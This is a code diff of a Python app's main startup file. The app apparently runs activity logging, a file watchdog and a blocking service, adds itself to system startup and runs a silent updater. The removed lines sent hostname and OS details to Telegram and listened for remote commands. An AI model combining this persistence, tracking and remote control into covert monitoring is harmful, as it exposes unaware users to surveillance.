@@ -2,48 +2,19 @@
 import sys
 import os
 import time
-import socket
-import platform
 import threading
-from datetime import datetime
 from src.core.single_instance import ensure_single_instance
 from src.core.file_monitor import start_file_watchdog
-from src.services.telegram_client import TelegramClient
 from src.utils.logger import setup_logger
 from src.core.startup import add_to_startup
-from src.core.network import wait_for_internet
 from src.core.activity_logger import start_logging
 from src.services.update_manager import UpdateManager
 from src.database.database import init_db
 from src.services.blocking_service import BlockingService
+from src.core.app_controller import AppController
+from src.api.api_server import APIServer
 logger = setup_logger()
 ENABLE_UPDATER = True
-
-# 🔒 Ensure only one instance runs
-mutex = ensure_single_instance()
-if not mutex:
-    logger.warning("Another instance is already running. Exiting.")
-    sys.exit(0)
-
-
-def get_executable_path():
-    if getattr(sys, "frozen", False):
-        return sys.executable
-    return os.path.abspath(__file__)
-
-
-def get_system_info() -> str:
-    hostname = socket.gethostname()
-    os_name = platform.system()
-    os_version = platform.version()
-    app_start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
-    return (
-        f"🖥 <b>System Started</b>\n"
-        f"• Hostname: {hostname}\n"
-        f"• OS: {os_name} {os_version}\n"
-        f"• Time: {app_start_time}"
-    )
 
 
 # ===============================
@@ -66,36 +37,59 @@ def safe_file_watchdog():
         logger.exception("File watchdog crashed unexpectedly")
 
 
+def get_executable_path():
+    if getattr(sys, "frozen", False):
+        return sys.executable
+    return os.path.abspath(__file__)
+
+
 def main():
     logger.info("Application started")
 
+    # 🔒 Ensure single instance
+    mutex = ensure_single_instance()
+    if not mutex:
+        logger.warning("Another instance is already running. Exiting.")
+        sys.exit(0)
+
+    def safe_api_server():
+        try:
+            logger.info("API server thread started")
+            server = APIServer()
+            server.start()
+        except Exception:
+            logger.exception("API server crashed unexpectedly")
+
     # Initialize database
     init_db()
-    exe_path = get_executable_path()
+
+    # Initialize App Controller (handles Telegram + config + internet internally)
+    app_controller = AppController()
+    app_controller.initialize()
+
     # Register startup only when running as packaged EXE
-    exe_path = get_executable_path()
-    # Run Blocking services
+    if getattr(sys, "frozen", False):
+        add_to_startup(get_executable_path())
+
+    # Small startup delay for system stability
+    time.sleep(5)
+
+    # ===============================
+    # 1️⃣ Start Blocking Service FIRST
+    # ===============================
     blocking_service = BlockingService()
     blocking_service.start()
-    logger.info("Blocking Service is started")
-    if getattr(sys, "frozen", False):
-        add_to_startup(exe_path)
+    logger.info("Blocking Service started")
 
-    # Give system some breathing room
-    time.sleep(10)
+    # ===============================
+    # 2️⃣ Start Activity Tracking
+    # ===============================
+    threading.Thread(
+        target=safe_api_server,
+        daemon=True,
+        name="APIServerThread"
+    ).start()
 
-    # Wait for internet
-    if not wait_for_internet(timeout=90):
-        logger.error("Startup aborted: No internet")
-        return
-
-    # Run updater only when packaged EXE
-    if ENABLE_UPDATER and getattr(sys, 'frozen', False):
-        logger.info("Checking for updates in background...")
-        updater = UpdateManager(silent=True, logger=logger)
-        updater.start()
-
-    # Start background threads with names
     threading.Thread(
         target=safe_activity_logger,
         daemon=True,
@@ -108,20 +102,21 @@ def main():
         name="FileWatchdogThread"
     ).start()
 
-    # Initialize Telegram client
-    client = TelegramClient()
+    logger.info("Activity tracking services started")
 
-    # Send startup message
-    if not client.send_message(get_system_info(), retries=5, delay=6):
-        logger.error("Startup message failed after retries")
-    else:
-        logger.info("Startup message delivered successfully")
+    # ===============================
+    # 3️⃣ Start Updater (Background)
+    # ===============================
+    if ENABLE_UPDATER and getattr(sys, "frozen", False):
+        logger.info("Starting background updater...")
+        updater = UpdateManager(silent=True, logger=logger)
+        updater.start()
 
-    time.sleep(5)
+    logger.info("System initialization completed successfully")
 
-    # Enter persistent listener
-    logger.info("Entering Telegram listener loop")
-    client.listen_forever()
+    # Keep main thread alive
+    while True:
+        time.sleep(60)
 
 
 if __name__ == "__main__":
